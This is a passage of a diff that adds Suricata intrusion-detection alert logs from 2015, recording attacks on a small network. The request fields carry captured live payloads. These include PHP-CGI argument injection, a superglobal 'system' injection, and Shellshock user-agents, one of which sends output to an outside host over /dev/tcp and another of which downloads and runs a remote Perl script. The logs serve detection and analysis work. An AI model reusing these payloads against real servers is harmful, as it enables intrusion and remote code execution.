+      "url": "//%63%67%69%2D%62%69%6E/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1126,
+      "bytes_toclient": 586,
+      "start": "2015-04-11T14:25:11.096175-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016683,
+      "rev": 2,
+      "signature": "ET WEB_SERVER WebShell Generic - wget http - POST",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-03-10T06:22:05.394090-0600",
+    "flow_id": 1671562112336746,
+    "pcap_cnt": 23739,
+    "event_type": "alert",
+    "src_ip": "192.168.0.51",
+    "src_port": 44461,
+    "dest_ip": "192.168.0.1",
+    "dest_port": 53,
+    "proto": "UDP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016778,
+      "rev": 5,
+      "signature": "ET DNS Query to a *.pw domain - Likely Hostile",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "app_proto": "dns",
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 74,
+      "bytes_toclient": 0,
+      "start": "2015-03-10T06:22:05.394090-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016977,
+      "rev": 3,
+      "signature": "ET WEB_SERVER allow_url_include PHP config option in uri",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016978,
+      "rev": 3,
+      "signature": "ET WEB_SERVER safe_mode PHP config option in uri",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016979,
+      "rev": 4,
+      "signature": "ET WEB_SERVER suhosin.simulation PHP config option in uri",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016980,
+      "rev": 5,
+      "signature": "ET WEB_SERVER disable_functions PHP config option in uri",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016981,
+      "rev": 4,
+      "signature": "ET WEB_SERVER open_basedir PHP config option in uri",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016982,
+      "rev": 3,
+      "signature": "ET WEB_SERVER auto_prepend_file PHP config option in uri",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016983,
+      "rev": 2,
+      "signature": "ET WEB_SERVER Access to /phppath/php Possible Plesk 0-day Exploit June 05 2013",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:41.084506-0600",
+    "flow_id": 1680667487015701,
+    "pcap_cnt": 164705,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47472,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2017436,
+      "rev": 2,
+      "signature": "ET WEB_SERVER PHP SERVER SuperGlobal in URI",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/scripts/index2.php?_SERVER[]=&_SERVER[REMOTE_ADDR]='.system('id').exit().'&option=wrapper&module[module]=1",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 682,
+      "bytes_toclient": 649,
+      "start": "2015-03-17T02:23:40.824085-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-26T18:21:21.827414-0600",
+    "flow_id": 975888015336547,
+    "pcap_cnt": 2238,
+    "event_type": "alert",
+    "src_ip": "61.240.144.65",
+    "src_port": 60000,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2017616,
+      "rev": 4,
+      "signature": "ET SCAN NETWORK Incoming Masscan detected",
+      "category": "Detection of a Network Scan",
+      "severity": 3
+    },
+    "http": {
+      "url": "/",
+      "http_user_agent": "masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.0",
+      "status": 200,
+      "length": 26
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 349,
+      "bytes_toclient": 828,
+      "start": "2015-03-26T18:21:18.631907-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T21:27:02.538096-0600",
+    "flow_id": 558077850301842,
+    "pcap_cnt": 40909,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 2042,
+    "dest_ip": "217.172.189.243",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2017694,
+      "rev": 6,
+      "signature": "ET CURRENT_EVENTS Possible Magnitude IE EK Payload Nov 8 2013",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "217.172.189.243",
+      "url": "/?7d0eabf9d51e708d121fa10a4c07673c",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2595
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 456,
+      "bytes_toclient": 3036,
+      "start": "2015-04-07T21:27:02.275858-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:29.463299-0600",
+    "flow_id": 1080875303375460,
+    "pcap_cnt": 162341,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47121,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2018056,
+      "rev": 2,
+      "signature": "ET WEB_SERVER Possible XXE SYSTEM ENTITY in POST BODY.",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/messagebroker/http",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1544,
+      "bytes_toclient": 649,
+      "start": "2015-03-17T02:23:29.201316-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-08T04:46:32.316048-0600",
+    "flow_id": 347959040838231,
+    "pcap_cnt": 113192,
+    "event_type": "alert",
+    "src_ip": "91.217.90.49",
+    "src_port": 42766,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2018232,
+      "rev": 3,
+      "signature": "ET EXPLOIT Possible ZyXELs ZynOS Configuration Download Attempt (Contains Passwords)",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "/rom-0",
+      "http_user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 203
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 422,
+      "bytes_toclient": 665,
+      "start": "2015-04-08T04:46:30.952919-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T07:35:05.364018-0600",
+    "flow_id": 1091084315096594,
+    "pcap_cnt": 152745,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 2214,
+    "dest_ip": "193.9.28.35",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2018582,
+      "rev": 10,
+      "signature": "ET TROJAN Miuref/Boaxxe Checkin",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "193.9.28.35",
+      "url": "/cBjda9AP5nqx92tozc7wv0L7g9IOW6z89K4MzlQ%2bjw8FCRbDJ3NEC7v%2bdFYRsNWq6ooqv%2bwGGN%2bq40sUBVlmwVM0xOWLMfw6%2bu2pYLj1uuvyZ%2b2xxoK8kW6%2b3mEmtdN6LgF2fEIThdAGZk2cQIUb6u%2bPXqaouqiARkIrwaxoYaSnlsEqJHWkyBlJLQvEbyWe5zf6I%2flNWFPL7CGNdBl%2bhOKeEnwNZ3LLoOlhAq48SznV2QCpwU02Y9BjniTosUypW11g3eH%2bSydXlReZO9Pp4IfAh63FIrLl6ednM9bSze8cCUPKsHtVJy%2fVvdUK1E0nzgmoT4F9fQQuIf%2bQPFS%2fJ7PfHaq1QY8X%2bb0xflYPdZ6Bve9B%2bukZpVo94tus3RiOvCDQMdX6bysUOm%2bY13s0Kk5XaSDJUTVJd6jsmhCVKMk9DleGoItlcu24dfIlMk6nk6oxMTD0GmBfJ9oTNUzsxMUOf06z4J6V1UpuepEdF6mJOJy%2fGtB6zYj66ysX1iCvMdhLqRPfb1LxL5zc46n9wFzheCmsrMRNITPxTetewxUVo1J0WnezLJ%2fnE4zkSIbiJZIfmkbSmFZbg%2bFd7ObQA%2b6ar0Chff2hfRRJN6v9kIpJng8QJxlmYxCtZDonUorGG859I2pQg%2bnkg0zL6LvMKsOoMQejHqshhjvCNU6bJf9HpC0",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1177,
+      "bytes_toclient": 1442,
+      "start": "2015-04-07T07:35:01.947730-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-18T04:35:45.739246-0600",
+    "flow_id": 1834680458111628,
+    "pcap_cnt": 46204,
+    "event_type": "alert",
+    "src_ip": "103.10.197.187",
+    "src_port": 2703,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 50100,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2018959,
+      "rev": 3,
+      "signature": "ET POLICY PE EXE or DLL Windows file download HTTP",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "103.10.197.187",
+      "url": "/mtpr.exe",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+      "http_content_type": "application/x-msdos-program",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 41599
+    },
+    "vars": {
+      "flowbits": {
+        "exe.no.referer": true,
+        "ET.http.binary": true
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 33,
+      "pkts_toclient": 34,
+      "bytes_toserver": 2320,
+      "bytes_toclient": 45122,
+      "start": "2015-03-18T04:35:39.354956-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:25:56.644842-0600",
+    "flow_id": 68362542810164,
+    "pcap_cnt": 183773,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 52920,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019232,
+      "rev": 4,
+      "signature": "ET WEB_SERVER Possible CVE-2014-6271 Attempt in Headers",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/cgi-bin/index.php5",
+      "http_user_agent": "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 216
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 658,
+      "bytes_toclient": 649,
+      "start": "2015-03-17T02:25:56.361524-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:25:56.360335-0600",
+    "flow_id": 924401064506675,
+    "pcap_cnt": 183722,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 52913,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019239,
+      "rev": 4,
+      "signature": "ET WEB_SERVER Possible CVE-2014-6271 Attempt in HTTP Cookie",
+      "category": "Attempted Administrator Privilege Gain",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/index.php",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 207
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 709,
+      "bytes_toclient": 640,
+      "start": "2015-03-17T02:25:56.095539-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-12T06:28:12.136123-0600",
+    "flow_id": 958067714428522,
+    "pcap_cnt": 84946,
+    "event_type": "alert",
+    "src_ip": "192.168.0.2",
+    "src_port": 35014,
+    "dest_ip": "217.195.49.146",
+    "dest_port": 63122,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019284,
+      "rev": 3,
+      "signature": "ET ATTACK_RESPONSE Output of id command from HTTP server",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 21,
+      "pkts_toclient": 24,
+      "bytes_toserver": 7290,
+      "bytes_toclient": 1697,
+      "start": "2015-03-12T06:25:46.659050-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-05T17:06:44.986623-0600",
+    "flow_id": 1084220470612980,
+    "pcap_cnt": 176620,
+    "event_type": "alert",
+    "src_ip": "46.28.206.148",
+    "src_port": 53983,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "url": "/",
+      "http_user_agent": "() { :;}; echo; /bin/uname -a > /dev/tcp/45.55.157.194/80;",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 108
+    },
+    "vars": {
+      "flowints": {
+        "http.anomaly.count": 1
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 5,
+      "bytes_toserver": 384,
+      "bytes_toclient": 706,
+      "start": "2015-04-05T17:06:42.676852-0600"
+    },
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2019285,
+      "rev": 3,
+      "signature": "ET WEB_SERVER Possible bash shell piped to dev tcp Inbound to WebServer",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    }
+  },
+  {
+    "timestamp": "2015-04-08T20:16:48.304137-0600",
+    "flow_id": 1941651116194580,
+    "pcap_cnt": 33858,
+    "event_type": "alert",
+    "src_ip": "66.135.38.206",
+    "src_port": 43497,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "HTTP/1.1",
+      "http_user_agent": "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://ubimed.com/cata.txt -O /tmp/b.pl;curl -O /tmp/b.pl http://ubimed.com/cata.txt;perl /tmp/b.pl;rm -rf /tmp/b.pl*\");'",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 5,
